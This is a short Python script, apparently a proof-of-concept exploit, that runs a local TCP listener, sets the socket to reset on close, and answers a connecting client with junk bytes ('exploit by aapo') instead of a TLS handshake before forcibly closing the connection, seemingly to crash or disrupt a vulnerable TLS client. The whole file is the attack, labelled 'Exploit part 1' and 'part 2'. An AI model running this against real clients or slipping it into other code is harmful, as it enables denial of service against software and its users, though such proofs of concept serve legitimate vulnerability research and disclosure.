import socket
import struct

# Listen for TCP connections
listener = socket.socket()
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# Exploit part 1: set the socket to be killed immediately when closed
listener.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
# Continue normal TCP listener stuff
listener.bind(("127.0.0.1", 12345))
listener.listen(5)
conn, address = listener.accept()

# Exploit part 2: Send malicious data instead of TLS handshake and immediately force close the connection
data = b"exploit by aapo"
conn.send(data)
conn.close()
